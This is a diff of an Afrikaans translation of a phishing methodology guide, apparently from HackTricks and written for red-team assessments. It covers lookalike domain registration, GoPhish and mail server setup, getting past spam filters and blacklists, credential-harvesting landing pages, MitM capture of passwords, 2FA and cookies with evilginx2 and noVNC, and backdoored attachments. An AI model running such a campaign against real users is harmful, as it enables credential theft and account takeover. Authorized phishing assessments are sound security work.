@@ -1,30 +1,30 @@
-# Phishing-metodologie
+# Phishing Methodology
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Metodologie
 
-1. Doen verkenning van die slagoffer
-1. Kies die **slagofferdomein**.
-2. Voer basiese web-enumerasie uit deur **aanmeldportale te soek** wat deur die slagoffer gebruik word en **besluit** watter een jy gaan **naboots**.
+1. Verken die slagoffer
+1. Kies die **slagoffer-domein**.
+2. Voer basiese web-enumerasie uit deur **aanmeldportale te soek** wat deur die slagoffer gebruik word, en **besluit** watter een jy gaan **naboots**.
 3. Gebruik **OSINT** om **e-posadresse te vind**.
 2. Berei die omgewing voor
 1. **Koop die domein** wat jy vir die phishing-assessment gaan gebruik
-2. **Konfigureer die e-posdiens se** verwante rekords (SPF, DMARC, DKIM, rDNS)
+2. **Konfigureer die e-posdiens** se verwante rekords (SPF, DMARC, DKIM, rDNS)
 3. Konfigureer die VPS met **gophish**
 3. Berei die veldtog voor
-1. Berei die **e-possjabloon** voor
-2. Berei die **webblad** voor om die geloofsbriewe te steel
+1. Berei die **e-pos-template** voor
+2. Berei die **webblad** voor om die credentials te steel
 4. Begin die veldtog!
 
-## Genereer soortgelyke domeinname of koop ’n betroubare domein
+## Genereer soortgelyke domeinname of koop 'n vertroude domein
 
-### Tegnieke vir domeinnaamvariasie
+### Domain Name Variation Techniques
 
-- **Sleutelwoord**: Die domeinnaam **bevat** ’n belangrike **sleutelwoord** van die oorspronklike domein (bv. zelster.com-management.com).<sup>[[1]](#references)</sup>
-- **Subdomein met koppelteken**: Verander die **punt na ’n koppelteken** van ’n subdomein (bv. www-zelster.com).
-- **Nuwe TLD**: Dieselfde domein met ’n **nuwe TLD** (bv. zelster.org)
-- **Homoglyph**: Dit **vervang** ’n letter in die domeinnaam met **letters wat soortgelyk lyk** (bv. zelfser.com).
+- **Keyword**: Die domeinnaam **bevat** 'n belangrike **keyword** van die oorspronklike domein (bv. zelster.com-management.com).<sup>[[1]](#references)</sup>
+- **hypened subdomain**: Verander die **punt na 'n koppelteken** van 'n subdomein (bv. www-zelster.com).
+- **New TLD**: Dieselfde domein met 'n **nuwe TLD** (bv. zelster.org)
+- **Homoglyph**: Dit **vervang** 'n letter in die domeinnaam met **letters wat soortgelyk lyk** (bv. zelfser.com).
 
 
 {{#ref}}
@@ -32,19 +32,19 @@ homograph-attacks.md
 {{#endref}}
 - **Transposition:** Dit **ruil twee letters** binne die domeinnaam om (bv. zelsetr.com).
 - **Singularization/Pluralization**: Voeg “s” aan die einde van die domeinnaam by of verwyder dit (bv. zeltsers.com).
-- **Weglating**: Dit **verwyder een** van die letters uit die domeinnaam (bv. zelser.com).
-- **Herhaling:** Dit **herhaal een** van die letters in die domeinnaam (bv. zeltsser.com).
-- **Vervanging**: Soos homoglyph, maar minder heimlik. Dit vervang een van die letters in die domeinnaam, moontlik met ’n letter naby die oorspronklike letter op die sleutelbord (bv. zektser.com).
-- **Subdomein**: Voeg ’n **punt** binne die domeinnaam in (bv. ze.lster.com).
-- **Invoeging**: Dit **voeg ’n letter** by die domeinnaam (bv. zerltser.com).
-- **Ontbrekende punt**: Voeg die TLD by die domeinnaam. (bv. zelstercom.com)
+- **Omission**: Dit **verwyder een** van die letters uit die domeinnaam (bv. zelser.com).
+- **Repetition:** Dit **herhaal een** van die letters in die domeinnaam (bv. zeltsser.com).
+- **Replacement**: Soos homoglyph, maar minder stealthy. Dit vervang een van die letters in die domeinnaam, moontlik met 'n letter wat naby die oorspronklike letter op die keyboard is (bv. zektser.com).
+- **Subdomained**: Voeg 'n **punt** binne die domeinnaam in (bv. ze.lster.com).
+- **Insertion**: Dit **voeg 'n letter** in die domeinnaam in (bv. zerltser.com).
+- **Missing dot**: Voeg die TLD by die domeinnaam. (bv. zelstercom.com)
 
-**Outomatiese nutsmiddels**
+**Automatic Tools**
 
 - [**dnstwist**](https://github.com/elceef/dnstwist)
 - [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)
 
-**Webwerwe**
+**Websites**
 
 - [https://dnstwist.it/](https://dnstwist.it)
 - [https://dnstwister.report/](https://dnstwister.report)
@@ -52,25 +52,25 @@ homograph-attacks.md
 
 ### Bitflipping
 
-Daar is ’n **moontlikheid dat een van sommige bisse wat gestoor word of in kommunikasie is, outomaties kan omkeer** weens verskeie faktore, soos sonvlamme, kosmiese strale of hardewarefoute.
+Daar is 'n **moontlikheid dat een van die bisse wat gestoor word of in kommunikasie is, outomaties omgekeer kan word** weens verskeie faktore soos sonvlamme, kosmiese strale of hardewarefoute.
 
 Wanneer hierdie konsep **op DNS-versoeke toegepas word**, is dit moontlik dat die **domein wat deur die DNS-bediener ontvang word** nie dieselfde is as die domein wat aanvanklik versoek is nie.
 
-Byvoorbeeld, kan ’n enkele biswysiging in die domein "windows.com" dit na "windnws.com" verander.
+Byvoorbeeld, kan 'n enkele bit-verandering in die domein "windows.com" dit na "windnws.com" verander.
 
-Aanvallers kan **dit benut deur verskeie bit-flipping-domeine te registreer** wat soortgelyk aan die slagoffer se domein is. Hulle doel is om wettige gebruikers na hul eie infrastruktuur te herlei.
+Aanvallers kan **hierdie geleentheid benut deur verskeie bit-flipping-domeine te registreer** wat soortgelyk aan die slagoffer se domein is. Hulle bedoeling is om wettige gebruikers na hul eie infrastruktuur te herlei.
 
-Lees [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) vir meer inligting.<sup>[[10]](#references)[[11]](#references)</sup>
+Vir meer inligting, lees [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>
 
-### Koop ’n betroubare domein
+### Koop 'n vertroude domein
 
-Jy kan op [https://www.expireddomains.net/](https://www.expireddomains.net) na ’n vervalde domein soek wat jy kan gebruik.\
-Om seker te maak dat die vervalde domein wat jy gaan koop **reeds goeie SEO het**, kan jy nagaan hoe dit gekategoriseer word in:
+Jy kan op [https://www.expireddomains.net/](https://www.expireddomains.net) soek vir 'n vervalde domein wat jy kan gebruik.\
+Om seker te maak dat die vervalde domein wat jy gaan koop **reeds goeie SEO het**, kan jy soek hoe dit gekategoriseer word in:
 
 - [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
 - [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)
 
-## Ontdekking van e-posadresse
+## E-posadresse ontdek
 
 - [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratis)
 - [https://phonebook.cz/](https://phonebook.cz) (100% gratis)
@@ -78,17 +78,17 @@ Om seker te maak dat die vervalde domein wat jy gaan koop **reeds goeie SEO het*
 - [https://hunter.io/](https://hunter.io)
 - [https://anymailfinder.com/](https://anymailfinder.com)
 
-Om **meer** geldige e-posadresse te **ontdek** of die adresse wat jy reeds ontdek het te **verifieer**, kan jy nagaan of jy dit teen die slagoffer se SMTP-bedieners kan brute-force. [Leer hier hoe om e-posadresse te verifieer/ontdek](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
-Moet ook nie vergeet dat, indien die gebruikers **enige webportaal gebruik om toegang tot hul e-posse te verkry nie**, jy kan nagaan of dit kwesbaar is vir **username brute force**, en die kwesbaarheid kan uitbuit indien moontlik.
+Om **meer** geldige e-posadresse te **ontdek** of die adresse wat jy reeds ontdek het te **verifieer**, kan jy kyk of jy brute-force op die SMTP-bedieners van die slagoffer kan uitvoer. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
+Moet ook nie vergeet dat indien die gebruikers **enige webportaal gebruik om toegang tot hul e-posse te verkry nie**, jy kan kyk of dit kwesbaar is vir **username brute force**, en die kwesbaarheid indien moontlik kan uitbuit.
 
-## Konfigurering van GoPhish
+## GoPhish konfigureer
 
 ### Installasie
 
 Jy kan dit aflaai vanaf [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)
 
 Laai dit af, dekomprimeer dit binne `/opt/gophish` en voer `/opt/gophish/gophish` uit\
-Jy sal ’n wagwoord vir die admin-gebruiker op poort 3333 in die uitvoer kry. Kry dus toegang tot daardie poort en gebruik daardie geloofsbriewe om die admin-wagwoord te verander. Jy sal moontlik daardie poort na plaaslik moet tonnel:
+Jy sal 'n password vir die admin-gebruiker op poort 3333 in die uitvoer kry. Gaan daarom na daardie poort en gebruik daardie credentials om die admin-password te verander. Jy sal moontlik daardie poort na local moet tunnel:
 ```bash
 ssh -L 3333:127.0.0.1:3333 <user>@<ip>
 ```
@@ -96,7 +96,7 @@ ssh -L 3333:127.0.0.1:3333 <user>@<ip>
 
 **TLS-sertifikaatkonfigurasie**
 
-Voor hierdie stap behoort jy **reeds die domein gekoop te hê** wat jy gaan gebruik, en dit moet **na die IP van die VPS wys** waar jy **gophish** konfigureer.
+Voor hierdie stap behoort jy **reeds die domein gekoop** te hê wat jy gaan gebruik, en dit moet **wys na** die **IP van die VPS** waar jy **gophish** konfigureer.
 ```bash
 DOMAIN="<domain>"
 wget https://dl.eff.org/certbot-auto
@@ -112,9 +112,9 @@ mkdir /opt/gophish/ssl_keys
 cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
 cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
 ```
-**Posopstelling**
+**Poskonfigurasie**
 
-Begin met die installering: `apt-get install postfix`
+Begin deur te installeer: `apt-get install postfix`
 
 Voeg dan die domein by die volgende lêers:
 
@@ -127,9 +127,9 @@ Voeg dan die domein by die volgende lêers:
 `myhostname = <domain>`\
 `mydestination = $myhostname, <domain>, localhost.com, localhost`
 
-Verander laastens die lêers **`/etc/hostname`** en **`/etc/mailname`** na jou domeinnaam en **herbegin jou VPS.**
+Laastens, wysig die lêers **`/etc/hostname`** en **`/etc/mailname`** na jou domeinnaam en **herbegin jou VPS.**
 
-Skep nou ’n **DNS A record** vir `mail.<domain>` wat na die **IP-adres** van die VPS wys, asook ’n **DNS MX**-record wat na `mail.<domain>` wys.
+Skep nou ’n **DNS A record** van `mail.<domain>` wat na die **IP-adres** van die VPS wys, asook ’n **DNS MX**-record wat na `mail.<domain>` wys.
 
 Kom ons toets nou om ’n e-pos te stuur:
 ```bash
@@ -226,11 +226,11 @@ service gophish stop
 ```
 ## Konfigureer mail server en domein
 
-### Wag en wees legitiem
+### Wag & wees legit
 
-Hoe ouer ’n domein is, hoe minder waarskynlik is dit dat dit as spam gemerk sal word. Daarom moet jy so lank as moontlik wag (ten minste 1 week) voordat die phishing-assessering plaasvind. Boonop sal die reputasie wat verkry word beter wees as jy ’n bladsy oor ’n sektor met ’n goeie reputasie plaas.
+Hoe ouer ’n domein is, hoe minder waarskynlik is dit dat dit as spam geïdentifiseer sal word. Daarom moet jy so lank as moontlik wag (minstens 1 week) voordat die phishing-assessment uitgevoer word. Verder sal die reputasie wat verkry word beter wees as jy ’n bladsy oor ’n sektor met ’n goeie reputasie plaas.
 
-Let daarop dat jy, selfs al moet jy ’n week wag, alles nou kan klaar konfigureer.
+Let daarop dat jy, selfs al moet jy ’n week wag, nou alles kan klaar konfigureer.
 
 ### Konfigureer Reverse DNS (rDNS)-rekord
 
@@ -248,19 +248,19 @@ Dit is die inhoud wat binne ’n TXT-rekord binne die domein gestel moet word:
 ```bash
 v=spf1 mx a ip4:ip.ip.ip.ip ?all
 ```
-### Domeingebaseerde Message Authentication, Reporting & Conformance (DMARC)-rekord
+### Domeingebaseerde boodskapverifikasie, verslagdoening en nakoming (DMARC)-rekord
 
-Jy moet **’n DMARC-rekord vir die nuwe domein konfigureer**. As jy nie weet wat ’n DMARC-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).
+Jy moet **'n DMARC-rekord vir die nuwe domein konfigureer**. As jy nie weet wat 'n DMARC-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).
 
-Jy moet ’n nuwe DNS TXT-rekord skep wat na die hostname `_dmarc.<domain>` wys, met die volgende inhoud:
+Jy moet 'n nuwe DNS TXT-rekord skep wat na die gasheernaam `_dmarc.<domain>` wys, met die volgende inhoud:
 ```bash
 v=DMARC1; p=none
 ```
 ### DomainKeys Identified Mail (DKIM)
 
-Jy moet **'n DKIM vir die nuwe domein opstel**. As jy nie weet wat 'n DMARC-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).
+Jy moet **'n DKIM vir die nuwe domein konfigureer**. As jy nie weet wat 'n DKIM-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).
 
-Hierdie handleiding is gebaseer op: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>
+Hierdie tutoriaal is gebaseer op: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>
 
 > [!TIP]
 > Jy moet albei B64-waardes wat die DKIM-sleutel genereer, saamvoeg:
@@ -271,12 +271,12 @@ Hierdie handleiding is gebaseer op: [https://www.digitalocean.com/community/tuto
 
 ### Toets jou e-poskonfigurasietelling
 
-Jy kan dit doen met [https://www.mail-tester.com/](https://www.mail-tester.com)\
-Gaan bloot na die bladsy en stuur 'n e-pos na die adres wat hulle aan jou verskaf:
+Jy kan dit doen deur [https://www.mail-tester.com/](https://www.mail-tester.com) te gebruik\
+Maak net die bladsy oop en stuur 'n e-pos na die adres wat hulle vir jou gee:
 ```bash
 echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
 ```
-Jy kan ook **jou e-poskonfigurasie nagaan** deur ’n e-pos aan `check-auth@verifier.port25.com` te stuur en **die antwoord te lees** (hiervoor sal jy poort **25** moet **oopmaak** en die antwoord in die lêer _/var/mail/root_ moet sien as jy die e-pos as root stuur).\
+Jy kan ook jou **e-poskonfigurasie nagaan** deur ’n e-pos aan `check-auth@verifier.port25.com` te stuur en die **antwoord te lees** (hiervoor sal jy poort **25** moet **oopmaak** en die antwoord in die lêer _/var/mail/root_ sien as jy die e-pos as root stuur).\
 Maak seker dat jy al die toetse slaag:
 ```bash
 ==========================================================
@@ -288,40 +288,40 @@ DKIM check:         pass
 Sender-ID check:    pass
 SpamAssassin check: ham
 ```
-Jy kan ook ’n **boodskap na ’n Gmail-rekening onder jou beheer stuur**, en die **e-pos se opskrifte** in jou Gmail-inkassie nagaan; `dkim=pass` behoort in die `Authentication-Results`-kopveld teenwoordig te wees.
+Jy kan ook **’n boodskap na ’n Gmail-rekening onder jou beheer stuur** en die **e-pos se opskrifte** in jou Gmail-inkassie nagaan; `dkim=pass` behoort in die `Authentication-Results`-opskrifveld teenwoordig te wees.
 ```
 Authentication-Results: mx.google.com;
 spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
 dkim=pass header.i=@example.com;
 ```
-### ​Verwydering van Spamhaus Blacklist
+### ​Verwydering van Spamhouse-bloklys
 
-Die bladsy [www.mail-tester.com](https://www.mail-tester.com) kan aandui of jou domein deur Spamhaus geblokkeer word. Jy kan versoek dat jou domein/IP verwyder word by: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)
+Die bladsy [www.mail-tester.com](https://www.mail-tester.com) kan aandui of jou domein deur spamhouse geblokkeer word. Jy kan versoek dat jou domein/IP verwyder word by: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)
 
-### Verwydering van Microsoft Blacklist
+### Verwydering van Microsoft-bloklys
 
 ​​Jy kan versoek dat jou domein/IP verwyder word by [https://sender.office.com/](https://sender.office.com).
 
 ## Skep & Begin GoPhish Campaign
 
-### Sending Profile
+### Stuurprofiel
 
-- Stel ’n **naam in om** die senderprofiel **te identifiseer**
+- Stel ’n **naam om te identifiseer** die senderprofiel in
 - Besluit vanaf watter rekening jy die phishing-e-posse gaan stuur. Voorstelle: _noreply, support, servicedesk, salesforce..._
 - Jy kan die gebruikersnaam en wagwoord leeg laat, maar maak seker dat jy Ignore Certificate Errors merk
 
-![Skep & Begin GoPhish Campaign - Sending Profile: Jy kan die gebruikersnaam en wagwoord leeg laat, maar maak seker dat jy Ignore Certificate Errors merk](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)
+![Skep & Begin GoPhish Campaign - Stuurprofiel: Jy kan die gebruikersnaam en wagwoord leeg laat, maar maak seker dat jy Ignore Certificate Errors merk](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)
 
 > [!TIP]
-> Dit word aanbeveel om die "**Send Test Email**"-funksie te gebruik om te toets of alles werk.\
-> Ek sal aanbeveel om die toets-e-posse na 10min-e-posadresse te stuur om te voorkom dat jy tydens die toetse op ’n blacklist beland.
+> Dit word aanbeveel om die "**Send Test Email**"-funksionaliteit te gebruik om te toets of alles werk.\
+> Ek sal aanbeveel om die toets-e-posse na 10min mail-adresse te **stuur** om te voorkom dat jy tydens die toetse op ’n bloklys geplaas word.
 
-### E-pos Template
+### E-possjabloon
 
-- Stel ’n **naam in om** die template **te identifiseer**
+- Stel ’n **naam om te identifiseer** die sjabloon in
 - Skryf dan ’n **onderwerp** (niks vreemds nie, net iets wat jy sou verwag om in ’n gewone e-pos te lees)
 - Maak seker dat jy "**Add Tracking Image**" gemerk het
-- Skryf die **e-pos template** (jy kan veranderlikes soos in die volgende voorbeeld gebruik):
+- Skryf die **e-possjabloon** (jy kan veranderlikes soos in die volgende voorbeeld gebruik):
 ```html
 <html>
 <head>
@@ -340,53 +340,53 @@ WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY
 </body>
 </html>
 ```
-Let daarop dat **om die geloofwaardigheid van die e-pos te verhoog**, dit aanbeveel word om ’n handtekening uit ’n e-pos van die kliënt te gebruik. Voorstelle:
+Let daarop dat **om die geloofwaardigheid van die e-pos te verhoog**, dit aanbeveel word om een of ander handtekening uit ’n e-pos van die kliënt te gebruik. Voorstelle:
 
 - Stuur ’n e-pos na ’n **nie-bestaande adres** en kyk of die antwoord enige handtekening bevat.
-- Soek vir **publieke e-posadresse** soos info@ex.com of press@ex.com of public@ex.com, stuur vir hulle ’n e-pos en wag vir die antwoord.
-- Probeer om ’n **geldige ontdekte** e-posadres te kontak en wag vir die antwoord
+- Soek **publieke e-posadresse** soos info@ex.com of press@ex.com of public@ex.com, stuur vir hulle ’n e-pos en wag vir die antwoord.
+- Probeer om ’n **geldige ontdekte** e-posadres te kontak en wag vir die antwoord.
 
 ![Sending Profile - Email Template: Probeer om ’n geldige ontdekte e-posadres te kontak en wag vir die antwoord](<../../images/image (80).png>)
 
 > [!TIP]
-> Die Email Template laat jou ook toe om **lêers aan te heg om te stuur**. As jy ook NTLM challenges wil steel deur spesiaal vervaardigde lêers/dokumente te gebruik, [lees hierdie bladsy](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).
+> Die Email Template laat jou ook toe om **lêers aan te heg om te stuur**. As jy ook NTLM challenges wil steel deur spesiaal vervaardigde lêers/dokumente te gebruik [lees hierdie bladsy](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).
 
 ### Landing Page
 
-- Skryf ’n **naam**
+- Stel ’n **naam** in.
 - **Skryf die HTML-kode** van die webblad. Let daarop dat jy webblaaie kan **import**.
-- Merk **Capture Submitted Data** en **Capture Passwords**
-- Stel ’n **redirection**
+- Merk **Capture Submitted Data** en **Capture Passwords**.
+- Stel ’n **redirect** in.
 
 ![Email Template - Landing Page: Merk Capture Submitted Data en Capture Passwords](<../../images/image (826).png>)
 
 > [!TIP]
-> Gewoonlik sal jy die HTML-kode van die bladsy moet wysig en plaaslik ’n paar toetse moet uitvoer (moontlik deur ’n Apache-bediener te gebruik) **totdat jy van die resultate hou.** Skryf dan daardie HTML-kode in die blokkie.\
-> Let daarop dat as jy **statiese hulpbronne** vir die HTML moet **use** (moontlik sommige CSS- en JS-bladsye), jy dit in _**/opt/gophish/static/endpoint**_ kan stoor en dit dan vanaf _**/static/\<filename>**_ kan access.
+> Gewoonlik sal jy die HTML-kode van die bladsy moet wysig en plaaslik ’n paar toetse moet uitvoer (moontlik deur ’n Apache-server te gebruik) **totdat jy van die resultate hou.** Skryf dan daardie HTML-kode in die blokkie.\
+> Let daarop dat, as jy **statiese hulpbronne** vir die HTML moet **gebruik** (moontlik sommige CSS- en JS-bladsye), jy dit in _**/opt/gophish/static/endpoint**_ kan stoor en dit dan vanaf _**/static/\<filename>**_ kan bereik.
 
 > [!TIP]
-> Vir die redirection kan jy die gebruikers **redirect na die legitieme hoofwebblad** van die slagoffer, of hulle byvoorbeeld na _/static/migration.html_ redirect, ’n **spinning wheel (**[**https://loading.io/**](https://loading.io)**) vir 5 sekondes plaas en dan aandui dat die proses suksesvol was**.
+> Vir die redirect kan jy die **gebruikers na die wettige hoofwebblad** van die slagoffer herlei, of hulle byvoorbeeld na _/static/migration.html_ herlei, ’n **laaisirkel (**[**https://loading.io/**](https://loading.io)**) vir 5 sekondes wys en dan aandui dat die proses suksesvol was**.
 
 ### Users & Groups
 
-- Stel ’n naam
-- **Import die data** (let daarop dat jy die voornaam, van en e-posadres van elke gebruiker nodig het om die template vir die voorbeeld te gebruik)
+- Stel ’n naam in.
+- **Import die data** (let daarop dat jy, om die template vir die voorbeeld te gebruik, die voornaam, van en e-posadres van elke gebruiker nodig het).
 
-![Landing Page - Users & Groups: Import die data (let daarop dat jy die voornaam, van en e-posadres van elke gebruiker nodig het om die template vir die voorbeeld te gebruik)](<../../images/image (163).png>)
+![Landing Page - Users & Groups: Import the data (let daarop dat jy die voornaam, van en e-posadres van elke gebruiker nodig het om die template vir die voorbeeld te gebruik)](<../../images/image (163).png>)
 
 ### Campaign
 
-Skep laastens ’n campaign deur ’n naam, die email template, die landing page, die URL, die sending profile en die groep te kies. Let daarop dat die URL die skakel sal wees wat aan die slagoffers gestuur word.
+Skep ten slotte ’n campaign deur ’n naam, die email template, die landing page, die URL, die sending profile en die groep te kies. Let daarop dat die URL die skakel sal wees wat aan die slagoffers gestuur word.
 
-Let daarop dat die **Sending Profile jou toelaat om ’n toets-e-pos te stuur om te sien hoe die finale phishing-e-pos sal lyk**:
+Let daarop dat die **Sending Profile jou toelaat om ’n toets-e-pos te stuur om te sien hoe die finale phishing-e-pos lyk**:
 
-![Users & Groups - Campaign: Let daarop dat die Sending Profile jou toelaat om ’n toets-e-pos te stuur om te sien hoe die finale phishing-e-pos sal lyk](<../../images/image (192).png>)
+![Users & Groups - Campaign: Let daarop dat die Sending Profile jou toelaat om ’n toets-e-pos te stuur om te sien hoe die finale phishing-e-pos lyk](<../../images/image (192).png>)
 
-Sodra alles gereed is, launch net die campaign!
+Wanneer alles gereed is, launch jy net die campaign!
 
 ## Website Cloning
 
-As jy om enige rede die webblad wil clone, kyk na die volgende bladsy:
+As jy om enige rede die webwerf wil clone, kyk na die volgende bladsy:
 
 
 {{#ref}}
@@ -395,8 +395,8 @@ clone-a-website.md
 
 ## Backdoored Documents & Files
 
-In sommige phishing-assessments (hoofsaaklik vir Red Teams) sal jy ook **lêers wil stuur wat een of ander soort backdoor bevat** (moontlik ’n C2 of dalk net iets wat ’n authentication sal trigger).\
-Kyk na die volgende bladsy vir ’n paar voorbeelde:
+In sommige phishing-assessments (hoofsaaklik vir Red Teams) sal jy ook **lêers wil stuur wat een of ander soort backdoor bevat** (moontlik ’n C2 of moontlik net iets wat ’n authentication sal trigger).\
+Kyk na die volgende bladsy vir enkele voorbeelde:
 
 
 {{#ref}}
@@ -407,53 +407,53 @@ phishing-documents.md
 
 ### Via Proxy MitM
 
-Die vorige aanval is redelik slim, aangesien jy ’n werklike webblad namaak en die inligting versamel wat deur die gebruiker ingevoer word. Ongelukkig, as die gebruiker nie die korrekte wagwoord ingevoer het nie, of as die toepassing wat jy nagemaak het met 2FA gekonfigureer is, **sal hierdie inligting jou nie toelaat om die misleide gebruiker na te boots nie**.
+Die vorige aanval is redelik slim, aangesien jy ’n regte webwerf namaak en die inligting insamel wat deur die gebruiker ingevoer word. Ongelukkig, as die gebruiker nie die korrekte wagwoord ingevoer het nie of as die toepassing wat jy nagemaak het met 2FA gekonfigureer is, **sal hierdie inligting jou nie toelaat om die misleide gebruiker na te boots nie**.
 
-Dit is waar nutsmiddels soos [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) en [**muraena**](https://github.com/muraenateam/muraena) nuttig is. Hierdie nutsmiddels laat jou toe om ’n MitM-agtige aanval te genereer. Basies werk die aanvalle soos volg:
+Dit is waar tools soos [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) en [**muraena**](https://github.com/muraenateam/muraena) nuttig is. Hierdie tool laat jou toe om ’n MitM-agtige aanval te genereer. Basies werk die aanvalle soos volg:
 
-1. Jy **boots die login**-vorm van die werklike webblad **na**.
-2. Die gebruiker **stuur** sy **credentials** na jou fake bladsy, en die nutsmiddel stuur dit na die werklike webblad, **terwyl dit kontroleer of die credentials werk**.
-3. As die rekening met **2FA** gekonfigureer is, sal die MitM-bladsy daarvoor vra, en sodra die **gebruiker dit invoer**, sal die nutsmiddel dit na die werklike webblad stuur.
-4. Sodra die gebruiker geauthentiseer is, sal jy (as aanvaller) die **credentials, die 2FA, die cookie en enige inligting** van elke interaksie hê wat plaasgevind het terwyl die nutsmiddel ’n MitM uitvoer.
+1. Jy **boots die login-form** van die regte webblad na.
+2. Die gebruiker **stuur** sy **credentials** na jou fake page, en die tool stuur dit na die regte webblad, **terwyl dit kontroleer of die credentials werk**.
+3. As die rekening met **2FA** gekonfigureer is, sal die MitM-bladsy daarvoor vra, en sodra die **gebruiker dit invoer**, sal die tool dit na die regte webblad stuur.
+4. Sodra die gebruiker ge-authenticate is, sal jy (as aanvaller) die **credentials, die 2FA, die cookie en enige inligting** van elke interaksie hê wat plaasvind terwyl die tool ’n MitM uitvoer.
 
 ### Via VNC
 
-Wat as jy, in plaas daarvan om die **slagoffer na ’n kwaadwillige bladsy** met dieselfde voorkoms as die oorspronklike te stuur, hom na ’n **VNC-sessie met ’n browser wat aan die werklike webblad gekoppel is** stuur? Jy sal kan sien wat hy doen, die wagwoord steel, die gebruikte MFA, die cookies...\
+Wat as jy, in plaas daarvan om die **slagoffer na ’n malicious page te stuur** wat dieselfde lyk as die oorspronklike een, hom na ’n **VNC-sessie met ’n browser wat aan die regte webblad gekoppel is** stuur? Jy sal kan sien wat hy doen, die wagwoord steel, die gebruikte MFA, die cookies...\
 Jy kan dit met [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) doen.<sup>[[3]](#references)[[4]](#references)</sup>
 
 ## Detecting the detection
 
-Een van die beste maniere om natuurlik te weet of jy uitgevang is, is om jou **domein binne blacklists te soek**. As dit gelys word, is jou domein op een of ander manier as verdag opgespoor.\
+Een van die beste maniere om te weet of jy uitgevang is, is natuurlik om jou domein binne **blacklists te soek**. As dit gelys verskyn, is jou domein op een of ander manier as verdag beskou.\
 Een maklike manier om te kyk of jou domein in enige blacklist verskyn, is om [https://malwareworld.com/](https://malwareworld.com) te gebruik.
 
-Daar is egter ander maniere om te weet of die slagoffer **aktief na verdagte phishing-aktiwiteit in die wild soek**, soos verduidelik in:
+Daar is egter ander maniere om te weet of die slagoffer **aktief na verdagte phishing-aktiwiteit in die natuur soek**, soos verduidelik in:
 
 
 {{#ref}}
 detecting-phising.md
 {{#endref}}
 
-Jy kan ’n **domein met ’n baie soortgelyke naam** as die slagoffer se domein **koop en/of ’n sertifikaat genereer** vir ’n **subdomein** van ’n domein wat deur jou beheer word, wat die slagoffer se domein se **keyword** bevat. As die **slagoffer** enige soort **DNS- of HTTP-interaksie** daarmee uitvoer, sal jy weet dat hy **aktief na** verdagte domeine **soek**, en jy sal baie stealthy moet wees.<sup>[[2]](#references)</sup>
+Jy kan ’n **domein met ’n baie soortgelyke naam** as die slagoffer se domein **koop en/of ’n sertifikaat genereer** vir ’n **subdomein** van ’n domein wat deur jou beheer word, wat die **keyword** van die slagoffer se domein **bevat**. As die **slagoffer** enige soort **DNS- of HTTP-interaksie** daarmee uitvoer, sal jy weet dat **hy aktief soek** na verdagte domeine en dat jy baie stealthy sal moet wees.<sup>[[2]](#references)</sup>
 
 ### Evaluate the phishing
 
-Gebruik [**Phishious** ](https://github.com/Rices/Phishious)om te evalueer of jou e-pos in die spam-lêergids gaan beland, of geblokkeer of suksesvol gaan wees.
